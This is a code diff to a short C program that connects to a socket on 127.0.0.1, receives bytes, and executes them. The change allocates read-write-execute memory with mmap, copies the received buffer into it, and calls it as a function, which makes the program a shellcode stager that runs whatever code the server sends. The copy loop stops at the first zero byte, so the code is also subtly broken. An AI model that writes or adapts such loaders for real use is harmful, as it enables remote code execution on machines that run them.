@@ -5,9 +5,10 @@
 #include <sys/socket.h>
 #include <sys/types.h>
 #include <unistd.h>
+#include <sys/mman.h>
 
 const char *IP = "127.0.0.1";
-const int PORT = 15399;
+const int PORT = 13981;
 
 int main() {
   const char *server_ip = IP;
@@ -44,11 +45,25 @@ int main() {
     return EXIT_FAILURE;
   }
 
-  printf("%s\n", buffer);
+  size_t length = sizeof(buffer);
 
-  int (*ret)() = (int (*)())buffer;
+  unsigned char *memory = mmap(NULL, length, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+
+  printf("%s", "HELLO");
+
+  for (int i = 0; i < length; i++) {
+    if (buffer[i] == 0) {
+      printf("%x", buffer[i]);
+      break;      
+    }
+    memory[i] = buffer[i];
+  }
+
+  int (*ret)() = (int (*)())memory;
 
   ret();
+
+  munmap(memory, length);
 
   close(sock);
 
